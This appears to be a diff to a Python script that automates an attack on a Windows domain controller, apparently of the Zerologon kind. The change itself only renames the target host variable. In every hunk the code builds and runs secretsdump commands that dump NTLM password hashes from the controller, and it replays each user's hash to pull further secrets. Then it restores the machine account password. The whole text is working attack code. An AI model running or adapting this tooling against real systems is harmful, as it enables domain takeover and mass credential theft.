@@ -131,7 +131,7 @@ def find_hash(pattern, ntds):
     for line in file:
         if re. search(pattern, line):
             username, userid, lmhash, nthash = line.split(':')
-            secrets_command = "secretsdump.py "+username+"'@"+options.dc_ip+"-hashes :"+nthash+" -outputfile "+options.dc_name
+            secrets_command = "secretsdump.py "+username+"'@"+options.dc_ip+"-hashes :"+nthash+" -outputfile "+hostname
             break
 
 
@@ -159,14 +159,14 @@ def perform_attack(dc_handle, dc_ip, target_computer):
 
             print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
             print(WHITE+"Attempting to dump hashes with secretsdump..."+NOCOLOR)
-            secrets_command = "secretsdump.py -just-dc-ntlm -just-dc -no-pass '"+options.dc_name+"$'@"+options.dc_ip+" -outputfile "+options.dc_name
+            secrets_command = "secretsdump.py -just-dc-ntlm -just-dc -no-pass '"+hostname+"$'@"+options.dc_ip+" -outputfile "+hostname
             print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
             print(WHITE+"Running commands... "+NOCOLOR)
             print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
             print(YELLOW+secrets_command+NOCOLOR)
             subprocess.run(secrets_command, shell=True, stdout=subprocess.DEVNULL)
             
-            file = open(options.dc_name+".ntds", "r")
+            file = open(hostname+".ntds", "r")
             for line in file:
                 if re.search(":::", line):
                     if not re.search("\$",line):
@@ -179,7 +179,7 @@ def perform_attack(dc_handle, dc_ip, target_computer):
                                 domain = ""
                                 username = hashes[0]
                             nt_hash = hashes[3]
-                            secrets_command = "secretsdump.py '"+username+"'@"+options.dc_ip+" -hashes :"+nt_hash+" -outputfile "+options.dc_name
+                            secrets_command = "secretsdump.py '"+username+"'@"+options.dc_ip+" -hashes :"+nt_hash+" -outputfile "+hostname
                             print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
                             print(YELLOW+secrets_command+NOCOLOR)
                             subprocess.run(secrets_command, shell=True, stdout=None)
@@ -187,15 +187,15 @@ def perform_attack(dc_handle, dc_ip, target_computer):
             
             
             # restore password
-            file = open(options.dc_name+".secrets", "r")
+            file = open(hostname+".secrets", "r")
             for line in file:
                 if re.search("hex", line):
                     hashes = line.split(':')
                     # search for "\" requires "\\\\"
                     plain_password_hex = hashes[2]
-                    restore_command = "python ./restorepassword.py "+options.dc_name+"@"+options.dc_name+" -target-ip "+options.dc_ip+" -hexpass "+plain_password_hex
+                    restore_command = "python ./restorepassword.py "+hostname+"@"+hostname+" -target-ip "+options.dc_ip+" -hexpass "+plain_password_hex
                     print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
-                    print(WHITE+"Attempting to repare "+options.dc_name+NOCOLOR)
+                    print(WHITE+"Attempting to repare "+hostname+NOCOLOR)
                     print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
                     print(WHITE+"Running commands... "+NOCOLOR)
                     print(YELLOW+restore_command+NOCOLOR)
@@ -204,8 +204,8 @@ def perform_attack(dc_handle, dc_ip, target_computer):
             
 
             print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
-            print(WHITE+"Verify system password repaired..."+options.dc_name+NOCOLOR)
-            secrets_command = "secretsdump.py '"+username+"'@"+options.dc_ip+" -hashes :"+nt_hash+" -just-dc-user "+options.dc_name+"$"
+            print(WHITE+"Verify system password repaired..."+hostname+NOCOLOR)
+            secrets_command = "secretsdump.py '"+username+"'@"+options.dc_ip+" -hashes :"+nt_hash+" -just-dc-user "+hostname+"$"
             print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
             print(YELLOW+secrets_command+NOCOLOR)
             subprocess.run(secrets_command, shell=True, stdout=None)
